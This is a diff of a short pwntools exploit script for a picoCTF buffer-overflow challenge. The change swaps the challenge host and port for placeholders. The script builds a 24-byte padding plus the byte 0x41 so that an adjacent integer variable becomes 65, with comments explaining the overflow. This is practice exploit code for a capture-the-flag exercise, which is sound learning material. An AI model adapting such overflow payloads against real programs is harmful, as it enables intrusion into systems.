@@ -1,7 +1,7 @@
 from pwn import *
 
-host = 'saturn.picoctf.net'
-port = 54182
+host = 'HOST_HERE'
+port = PORT_HERE
 
 pad = b'A' * 24 #To get to our buffer and overflow it
 numb = b'\x41' #The target binary is set to int num = 64; and to get our flag we need the num variable to equal 65. 0x41 is 65 in hexadecimal and we use this to overwrite the num variable
